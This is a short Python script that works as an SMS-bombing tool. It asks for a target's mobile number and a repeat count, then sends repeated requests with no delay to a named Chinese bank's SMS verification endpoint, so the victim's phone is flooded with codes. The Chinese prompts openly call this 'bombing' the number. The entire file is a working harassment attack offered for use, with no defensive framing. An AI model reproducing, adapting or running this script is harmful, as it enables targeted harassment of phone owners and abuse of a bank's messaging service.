# coding: utf-8

__author__ = "lau.wenbo"


import requests
import time
while True:
    print("请输入手机号",end=":")
    mobile=input()
    if len(mobile) != 11: #判断输入长度
        print("手机号码长度错误！")
    else:
        print("请输入轰炸次数", end=":")
        num = int(input())
        print("你要轰炸",num,"次","马上开始!")
        i = 1
        while num > 0 :
            payload = {"AcNo":"","MobilePhone":"","BankId":"9999","Transaction":"CreditOnlineApplyCert","_locale":"zh_CN"} #构造关键字的字典
            payload["MobilePhone"]= mobile #添加字典内容
            url = "https://pbank.psbc.com/pweb/GetSmsForOutQuickPayment.do?"
            r = requests.get(url,params=payload) #开始get 并构造了url
            print("正在轰炸",mobile,"，轰炸第",i,"次")
            num = num - 1
            i+=1
            time.sleep(0)# 间隔时间
        print("轰炸完成！")